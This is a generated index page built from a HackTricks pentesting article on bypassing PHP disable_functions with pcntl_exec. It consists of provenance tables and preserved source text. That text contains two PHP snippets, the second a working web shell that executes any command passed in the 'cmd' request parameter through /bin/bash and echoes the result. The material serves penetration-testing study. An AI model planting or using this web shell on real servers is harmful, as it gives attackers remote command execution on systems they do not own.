---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# PHP 4 &gt;= 4.2.0, PHP 5 pcntl_exec

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-network-services-pentesting-pentesting-web-php-tricks-esp-php-useful-functions-disable-functions-open-basedir-bypass-disable-functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl-exec` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [PHP 4 &gt;= 4.2.0, PHP 5 pcntl_exec](../../topics/network-services-pentesting/php-4-andgt-4.2.0-php-5-pcntl-exec.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-network-services-pentesting-pentesting-web-php-tricks-esp-php-useful-functions-disable-functions-open-basedir-bypass-disable-functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl-exec |
| name | PHP 4 &gt;= 4.2.0, PHP 5 pcntl_exec |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.md |

## Preserved Source Material

````yaml
_body: "# PHP 4 &gt;= 4.2.0, PHP 5 pcntl_exec\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n\nFrom [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)\n\
  \n```php\n<?php\n$dir = '/var/tmp/';\n$cmd = 'ls';\n$option = '-l';\n$pathtobin = '/bin/bash';\n\n$arg = array($cmd, $option,\
  \ $dir);\n\npcntl_exec($pathtobin, $arg);\necho '123';\n?>\n<?php\n$cmd = @$_REQUEST[cmd];\nif(function_exists('pcntl_exec'))\
  \ {\n    $cmd = $cmd.\"&pkill -9 bash >out\";\n    pcntl_exec(\"/bin/bash\", $cmd);\n    echo file_get_contents(\"out\"\
  );\n} else {\n        echo '不支持pcntl扩展';\n}\n?>\n```\n\n{{#include ../../../../banners/hacktricks-training.md}}"
_relative_path: network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.md
````
